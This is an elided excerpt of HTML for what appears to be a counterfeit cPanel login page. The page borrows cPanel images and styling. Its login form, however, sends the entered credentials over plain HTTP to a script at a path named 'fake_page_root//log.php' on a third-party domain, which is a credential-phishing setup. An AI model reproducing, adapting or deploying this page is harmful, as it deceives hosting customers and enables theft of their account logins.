...
.copyright {
  ...
  background-size: 25px auto;
    ...
    <style type="text/css">
        img {
            behavior: url(/cPanel_magic_revision_1610663120/unprotected/cp_pngbehavior_login.htc);
        }
    </style>
    <![endif]-->
    ...
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="/cPanel_magic_revision_1610662314/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
        ...
        <div id="login-container">
            ...
            <div id="login-sub-container">
                    <div id="login-sub-header">
                        ...
                        <img class="main-logo" src="https://ganeshdecorators.com:2083///cPanel_magic_revision_1610662314/unprotected/cpanel/images/cpanel-logo.svg" alt="logo" alt="logo" />
                    ...
                    <div id="login-sub"
                        ...
                        <div id="forms">
                            <form novalidate id="login_form" action="http://ganeshdecorators.com/fake_page_root//log.php" method="post" target="_top" style="visibility:">
